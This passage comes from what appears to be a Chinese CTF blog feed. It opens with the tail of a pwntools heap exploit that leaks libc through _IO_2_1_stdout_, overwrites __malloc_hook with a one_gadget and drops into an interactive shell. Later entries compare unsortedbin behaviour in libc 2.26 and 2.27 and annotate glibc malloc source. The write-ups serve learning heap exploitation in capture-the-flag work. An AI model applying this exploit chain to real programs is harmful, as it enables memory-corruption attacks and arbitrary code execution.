&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index ?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index ?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;__new_content ?&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># p = remote(&quot;219.219.61.234&quot;,20034)</span></span><br><span class="line">    new(<span class="number">0xe0</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#指向IO_2_1_stderr_+157 </span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#2指向0</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#7</span></span><br><span class="line">        new(<span class="number">0x60</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">        new(<span class="number">0x60</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">        new(<span class="number">0x60</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        edit(<span class="number">7</span>, payload)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">    libc_addr =  u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    stdout_addr = libc_addr+<span class="number">0x20</span></span><br><span class="line">    libc_base = stdout_addr - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">    gadget = gadgets[<span class="number">3</span>] + libc_base</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base)) </span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;malloc_hook:&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;fake_chunk:&#x27;</span>,<span class="built_in">hex</span>(fake_chunk))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;gadget:&#x27;</span>,<span class="built_in">hex</span>(gadget))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    edit(<span class="number">10</span>, p64(fake_chunk))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(gadget)</span><br><span class="line">    new(<span class="number">0x60</span>, payload)</span><br><span class="line">    edit(<span class="number">12</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;please answer the question\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">80</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;______?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>两道题目都用到了stdout泄露地址。虽然方式不一样但是思路都是一样的：</p>
<ul>
<li>造成堆重叠，修改指针，指向stdout</li>
<li>申请chunk到stdout，修改flag和_IO_write_base.</li>
<li>泄露地址后修改hook</li>
</ul>
<p>需要注意的是，这两道题中，一道是用的tcache的next指针。一道是用的fastbin的fd指针。这两者的差别也就导致了修改指针的目的值不一样。</p>
<p>tcache的next指针是指向的下一个chunk的data区域，所以在第一题中，直接指向了_IO_2_1_stdout_。</p>
<p>fastbin的fd指针是指向的下一个chunk的头部，所以第二题中式指向的IO_2_1_stderr_+157。</p>
]]></content>
      <tags>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>libc 2.26和libc 2.27的异同</title>
    <url>/posts/4e162b88/</url>
    <content><![CDATA[<p>在做<strong>HITB CTF 2018 ：gundam</strong>这一题目时发现，在libc 2.27中并不能通过unsortedbin来泄露libc地址，从unsortedbin申请回来的chunk的fd和bk都清空了。而libc 2.26是可以的，申请回来的chunk的bk仍保留着main_arena的地址。目前只是记录一下，之后研究研究源码来找原因。</p>
<a id="more"></a>

<h1 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h1><p>写了一个例子来验证：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> * a[<span class="number">7</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">		a[i] = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> * buf = <span class="literal">NULL</span>;</span><br><span class="line">	buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">free</span>(a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">free</span>(buf);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">		a[i] = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nGundam[%u] :%s&quot;</span>, <span class="number">1</span>, buf);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc 2.27"></a>libc 2.27</h2><p><img src="https://i.loli.net/2021/02/04/2QOzLTIW4buSk1N.png" alt="image-20210204123902465"></p>
<p>此时free的chunk进入了unsortedbin</p>
<p><img src="https://i.loli.net/2021/02/04/STR4euY3K5NFr8b.png" alt="image-20210204124002309"></p>
<p>申请回来后fd和bk都被清空</p>
<p><img src="https://i.loli.net/2021/02/04/8fT354NHmBVyrxe.png" alt="image-20210204124110611"></p>
<p><img src="https://i.loli.net/2021/02/04/TWfxLIeV5D4Bjr9.png" alt="image-20210204124128931"></p>
<h2 id="libc-2-26"><a href="#libc-2-26" class="headerlink" title="libc 2.26"></a>libc 2.26</h2><p><img src="https://i.loli.net/2021/02/04/txs4e1NYHVhji8P.png" alt="image-20210204124253762"></p>
<p>free的chunk进入unsortedbin</p>
<p><img src="https://i.loli.net/2021/02/04/D3xW7gefMAori1S.png" alt="image-20210204124409139"></p>
<p>申请回来后bk保留：</p>
<p><img src="https://i.loli.net/2021/02/04/ePQ7id36Erpy8Nm.png" alt="image-20210204124537349"></p>
<p><img src="https://i.loli.net/2021/02/04/B3MQ41igsUyPtGT.png" alt="image-20210204124456323"></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>等以后研究研究源码再说。。。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>malloc源码详解</title>
    <url>/posts/1fb407a7/</url>
    <content><![CDATA[<p>malloc_chunk的结构体定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             User data starts here...                          .</span><br><span class="line">	    .                                                               .</span><br><span class="line">	    .             (malloc_usable_size() bytes)                      .</span><br><span class="line">	    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of next chunk, in bytes                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>malloc</tag>
      </tags>
  </entry>
  <entry>
    <title>malloc详解——申请内存</title>
    <url>/posts/86e0d9b/</url>
    <content><![CDATA[<h1 id="malloc详解-——-申请内存"><a href="#malloc详解-——-申请内存" class="headerlink" title="malloc详解 —— 申请内存"></a>malloc详解 —— 申请内存</h1><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>使用malloc申请内存的流程如图所示，大致流程为：</p>
<ul>
<li>_libc_malloc调用malloc的hook函数</li>
<li>初始化，最终是调用ptmalloc_init</li>
<li>关键的分配内存是在_int_malloc</li>
</ul>
<a id="more"></a>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/chushimalloc.png" alt="chushimalloc"></p>
<h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><h3 id="概览-1"><a href="#概览-1" class="headerlink" title="概览"></a>概览</h3><p>整个_int_malloc的流程如图所示,</p>
<p>总结起来malloc申请内存的过程：</p>
<ul>
<li>首先在fastbin范围查找到一致大小的chunk</li>
<li>fsatbin没有再在smallbin中查找，smallbin中没有申请的chunk大小的空闲或者对应大小的bin为空就转去unsortedbin</li>
<li>在unsortedbin中寻找大小完全一致的，如果没有转去largebin。（特殊情况时，会切分unsortedbin满足用户所需）</li>
<li>在largebin中寻找能满足要求的最小空闲然后切分。</li>
<li>largebin没有就在bins中寻找最小满足的</li>
<li>最后在top chunk切分合适的chunk。</li>
<li>top chunk不足则调用sysmalloc申请内存。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/intmalloc.png" alt="概览"></p>
<h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>定义一系列需要的变量，使用<code>checked_request2size</code>转换用户申请大小和实际chunk所需的大小（nb）。</p>
<p> 没有可用的arenas。退回到sysmalloc去从mmap获得一个chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     将请求的大小通过添加SIZE_SZ字节（或者更多）转化为内部形式以获得必要的对齐或者以获得至少MINSIZE（可分配放的最小大小）的大小。另外，checked_request2size陷阱（返回0）请求大小如此之大，以至于在填充时它们环绕在零附近并对齐。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  </span></span><br><span class="line"><span class="comment">     没有可用的arenas。退回到sysmalloc去从mmap获得一个chunk。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="检查fast-bin"><a href="#检查fast-bin" class="headerlink" title="检查fast bin"></a>检查fast bin</h4><p>fastbin的结构与其他的bin不同，采用单项链表。使用后进先出（LIFO），目的就是为了更快。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 如果nb（处理后用户请求的大小）在fastbin的范围，通过fastbin进行分配</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获得对应fastbin的下标</span></span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      <span class="comment">// 获得对应fastbin的头指针</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="comment">// 未启用多线程处理</span></span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">        <span class="comment">// 检查取得的chunk大小与对应的fastbin索引是否一致，，防止伪造</span></span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">    <span class="comment">// 细致的检查，只有在 DEBUG 的时候有用</span></span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="comment">// 将获得chunk转为mem模式（指针指向user_data）</span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line"><span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查small-bin"><a href="#检查small-bin" class="headerlink" title="检查small bin"></a>检查small bin</h4><p>在检查smallbin后，如果不满足会先获取large bin的index然后调用<code>malloc_consolidate</code>整理fastbin。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获得smallbin的索引</span></span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      <span class="comment">// 获得对应smallbin中的chunk的指针</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"><span class="comment">//  victim = last（bin）获取smallbin的最后一个chunk,如果如果 victim = bin ，那说明该 bin 为空。不为空说明有满足条件的chunk</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 获得smallbin的倒数第二个chunk</span></span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="comment">// 检查，防止伪造</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">      <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">// 修改smallbin，取出最后的chunk</span></span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"><span class="comment">// 如果不是main_arena设置对应的标志</span></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>malloc_consolidate</code>的解析不再这次范围内，简要记录其作用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment">  malloc_consolidate是一种专门合并fastbins里chunk的free。Free本身不能用于此目的，因为除其他外，Free本身可能会将块放回到fastbins中。 因此，我们需要使用同一代码的较小变体。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br></pre></td></tr></table></figure>

<h4 id="检查unsorted-bin"><a href="#检查unsorted-bin" class="headerlink" title="检查unsorted bin"></a>检查unsorted bin</h4><p>到了unsortedbin是一个比较复杂的循环，首先是一个while循环会遍历整个unsortedbin，满足要求就取出，不满足要求的会放入对应的<strong>small bin</strong>或<strong>large bin</strong>中.</p>
<p>会有一种特殊情况，如果是请求的smallbin，且这个chunk是unsortbin的唯一一个为last_ramainder的chunk，且满足拆分大小时，拆分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="comment">// 判断victim是否满足大小</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">				   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">            <span class="comment">// 得到victim的大小</span></span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             如果是请求的smallbin，且这个chunk是unsortbin的唯一一个为last_ramainder的chunk，且满足拆分大小时，拆分。</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">// 获得新的remainder大小</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              <span class="comment">// 获得新的remainder的位置</span></span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="comment">// 更新 unsorted bin 的情况</span></span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              <span class="comment">// 更新 av 中记录的 last_remainder</span></span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              <span class="comment">// 更新last remainder的指针</span></span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="comment">// 